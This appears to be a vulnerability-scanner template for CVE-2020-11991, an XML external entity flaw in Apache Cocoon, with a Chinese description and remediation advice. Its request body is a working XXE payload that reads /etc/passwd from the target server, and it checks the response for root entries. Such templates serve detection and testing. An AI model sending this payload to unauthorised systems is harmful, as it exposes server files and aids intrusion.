id: CVE-2020-11991
info:
  name: Apache Cocoon 2.1.12 XML Injection
  author:
  - l0ne1y
  description: |-
    apache cocoon StreamGenerator XXE漏洞
    漏洞存在于Apache Cocoon中的StreamGenerator组件中，该组件将会解析用户提交的XML格式的数据，攻击者会通过发送精心构造的XML格式的恶意数据来触发漏洞，当传入的参数存在敏感操作时，达到获取目标系统敏感文件及服务器权限
  severity: high
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/r77add973ea521185e1a90aca00ba9dae7caa8d8b944d92421702bb54%40%3Cusers.cocoon.apache.org%3E

    **临时修复方案**
    1、禁用外部实体
    2、过滤用户提交的XML数据，关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/v2/api/product/manger/getInfo'
  method: POST
  body: |
    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
    <userInfo>
    <firstName>John</firstName>
    <lastName>&ent;</lastName>
    </userInfo>
  headers:
    Content-Type: text/xml
